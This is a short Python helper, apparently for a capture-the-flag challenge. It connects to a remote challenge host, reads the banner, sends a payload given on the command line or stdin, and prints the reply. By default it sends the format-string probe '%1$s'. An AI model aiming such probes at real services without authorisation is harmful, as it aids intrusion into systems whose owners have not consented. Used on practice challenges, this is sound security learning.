import socket, sys, time

HOST = "0.cloud.chals.io"
PORT = 23023

def send_payload(payload: bytes, wait=1.5, recvsize=8192):
    s = socket.create_connection((HOST, PORT), timeout=5)
    s.settimeout(2)
    buf = b""
    try:
        while True:
            chunk = s.recv(recvsize)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    s.sendall(payload)
    time.sleep(0.3)
    resp = b""
    try:
        s.settimeout(wait)
        while True:
            chunk = s.recv(recvsize)
            if not chunk:
                break
            resp += chunk
    except socket.timeout:
        pass
    s.close()
    return buf, resp

if __name__ == "__main__":
    payload = sys.argv[1].encode() if len(sys.argv) > 1 else b"%1$s\n"
    if payload == b"--raw":
        payload = sys.stdin.buffer.read()
    banner, resp = send_payload(payload)
    sys.stdout.write("BANNER: " + repr(banner) + "\n")
    sys.stdout.write("RESP: " + repr(resp) + "\n")
